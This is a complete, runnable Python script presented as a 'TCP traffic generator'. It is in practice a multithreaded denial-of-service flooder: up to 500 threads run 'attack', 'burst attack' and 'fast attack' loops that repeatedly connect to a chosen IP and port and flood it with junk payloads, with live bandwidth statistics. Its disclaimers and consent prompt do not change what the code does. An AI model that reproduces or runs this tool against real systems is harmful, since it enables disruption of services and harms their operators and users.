#!/usr/bin/env python3
"""
tcp_traffic_generator.py - TCP traffic generation tool
WARNING: For authorized testing only on systems you own or control.
"""

import socket
import threading
import time
import sys
import random
import signal

class TrafficGenerator:
    def __init__(self):
        self.running = True
        self.packets_sent = 0
        self.bytes_sent = 0
        self.lock = threading.Lock()
        
    def signal_handler(self, sig, frame):
        print("\n\nStopping traffic generation...")
        self.running = False
        
    def create_payload(self, size, variant=0):
        base = bytearray([ord('A') + (variant % 26) for _ in range(size)])
        
        for i in range(0, size, 16):
            base[i] = random.randint(0, 255)
            
        return bytes(base)
    
    def safe_connect(self, sock, target_ip, target_port, timeout=2.0):
        try:
            sock.settimeout(timeout)
            sock.connect((target_ip, target_port))
            return True
        except:
            return False
    
    def attack_thread(self, target_ip, target_port, thread_id):
        target = (target_ip, target_port)
        payload = self.create_payload(1024, thread_id)
        thread_packets = 0
        
        print(f"[Thread {thread_id}] Targeting {target_ip}:{target_port}")
        
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8192)
                
                if self.safe_connect(sock, target_ip, target_port):
                    for _ in range(100):
                        if not self.running:
                            sock.close()
                            return
                            
                        try:
                            sent = sock.send(payload)
                            if sent > 0:
                                thread_packets += 1
                                with self.lock:
                                    self.bytes_sent += sent
                                
                                if thread_packets % 1000 == 0:
                                    with self.lock:
                                        self.packets_sent += 1000
                                
                                if sent == len(payload):
                                    payload = self.create_payload(1024, random.randint(0, 255))
                        except:
                            break
                            
                    sock.close()
                else:
                    time.sleep(0.01)
                    
            except:
                time.sleep(0.05)
        
        with self.lock:
            self.packets_sent += (thread_packets % 1000)
    
    def burst_attack_thread(self, target_ip, target_port, thread_id):
        print(f"[Thread {thread_id}] Burst attack on {target_ip}:{target_port}")
        
        packets = []
        for i in range(10):
            pkt = bytearray([ord('A') + i for _ in range(1400)])
            for j in range(0, 1400, 20):
                pkt[j] = random.randint(0, 255)
            packets.append(bytes(pkt))
        
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                
                if self.safe_connect(sock, target_ip, target_port):
                    for burst in range(100):
                        if not self.running:
                            sock.close()
                            return
                            
                        for i in range(10):
                            try:
                                sent = sock.send(packets[i])
                                if sent > 0:
                                    with self.lock:
                                        self.packets_sent += 1
                                        self.bytes_sent += sent
                                else:
                                    break
                            except:
                                break
                    
                    sock.close()
                time.sleep(0.001)
            except:
                time.sleep(0.01)
    
    def fast_attack_thread(self, target_ip, target_port, thread_id):
        print(f"[Thread {thread_id}] Fast attack on {target_ip}:{target_port}")
        
        payload = self.create_payload(1024, thread_id)
        thread_packets = 0
        
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                
                if self.safe_connect(sock, target_ip, target_port):
                    for i in range(500):
                        if not self.running:
                            sock.close()
                            return
                            
                        try:
                            sent = sock.send(payload)
                            if sent > 0:
                                thread_packets += 1
                                with self.lock:
                                    self.bytes_sent += sent
                                
                                if thread_packets % 1000 == 0:
                                    with self.lock:
                                        self.packets_sent += 1000
                                
                                payload = self.create_payload(1024, thread_packets % 256)
                            else:
                                break
                        except:
                            break
                    
                    sock.close()
            except:
                time.sleep(0.01)
        
        with self.lock:
            self.packets_sent += (thread_packets % 1000)
    
    def display_stats(self, start_time, attack_duration):
        last_packets = 0
        last_bytes = 0
        
        while self.running:
            time.sleep(1)
            elapsed = time.time() - start_time
            
            if elapsed >= attack_duration:
                self.running = False
                break
                
            with self.lock:
                current_packets = self.packets_sent
                current_bytes = self.bytes_sent
                
                packets_per_sec = current_packets - last_packets
                bytes_per_sec = current_bytes - last_bytes
                
                last_packets = current_packets
                last_bytes = current_bytes
                
                mbps = (bytes_per_sec * 8) / 1000000.0
                
                time_left = max(0, attack_duration - int(elapsed))
                print(f"\rTime: {int(elapsed)}/{attack_duration}s | "
                      f"Packets/s: {packets_per_sec} | "
                      f"Bandwidth: {mbps:.2f} Mbps", end="", flush=True)
    
    def run(self, target_ip, target_port, thread_count, duration):
        print(f"\nTCP Traffic Generator")
        print(f"Target: {target_ip}:{target_port}")
        print(f"Threads: {thread_count}")
        print(f"Duration: {duration} seconds")
        print("-" * 60)
        
        signal.signal(signal.SIGINT, self.signal_handler)
        
        print("WARNING: Only use on systems you own or have permission to test!")
        print("Starting in 3 seconds...")
        time.sleep(3)
        
        threads = []
        for i in range(thread_count):
            if i % 3 == 0:
                thread = threading.Thread(
                    target=self.attack_thread,
                    args=(target_ip, target_port, i)
                )
            elif i % 3 == 1:
                thread = threading.Thread(
                    target=self.burst_attack_thread,
                    args=(target_ip, target_port, i)
                )
            else:
                thread = threading.Thread(
                    target=self.fast_attack_thread,
                    args=(target_ip, target_port, i)
                )
            thread.daemon = True
            thread.start()
            threads.append(thread)
            time.sleep(0.01)
        
        start_time = time.time()
        stats_thread = threading.Thread(
            target=self.display_stats,
            args=(start_time, duration)
        )
        stats_thread.start()
        
        try:
            stats_thread.join()
        except KeyboardInterrupt:
            self.running = False
            
        print("\n\nWaiting for threads to stop...")
        for thread in threads:
            thread.join(timeout=2)
        
        total_time = time.time() - start_time
        print(f"\n{'='*60}")
        print("Traffic Generation Complete")
        print(f"Total runtime: {total_time:.1f} seconds")
        print(f"Total packets sent: {self.packets_sent:,}")
        print(f"Total bytes sent: {self.bytes_sent:,}")
        
        if total_time > 0:
            avg_mbps = (self.bytes_sent * 8 / total_time / 1000000.0)
            print(f"Average bandwidth: {avg_mbps:.2f} Mbps")
        print(f"{'='*60}")

def main():
    if len(sys.argv) != 5:
        print("Usage: python tcp.py <ip> <port> <threads> <time>")
        print("Example: python tcp.py 127.0.0.1 80 10 30")
        print("Will send up to 100k packets per connection")
        print("\nWARNING: For authorized testing only!")
        sys.exit(1)
    
    try:
        target_ip = sys.argv[1]
        target_port = int(sys.argv[2])
        thread_count = int(sys.argv[3])
        duration = int(sys.argv[4])
        
        if thread_count < 1 or thread_count > 500:
            print("Threads should be 1-500")
            sys.exit(1)
        
        if duration < 1:
            print("Time must be positive")
            sys.exit(1)
        
        print("\n" + "!" * 70)
        print("DISCLAIMER: This tool is for EDUCATIONAL PURPOSES ONLY.")
        print("Use only on systems you own or have explicit permission to test.")
        print("Unauthorized use may violate laws and terms of service.")
        print("!" * 70 + "\n")
        
        response = input("Do you understand and accept responsibility? (yes/no): ")
        if response.lower() != 'yes':
            print("Exiting.")
            sys.exit(0)
        
        generator = TrafficGenerator()
        generator.run(target_ip, target_port, thread_count, duration)
        
    except ValueError:
        print("Invalid arguments. Port, threads, and time must be integers.")
        sys.exit(1)
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()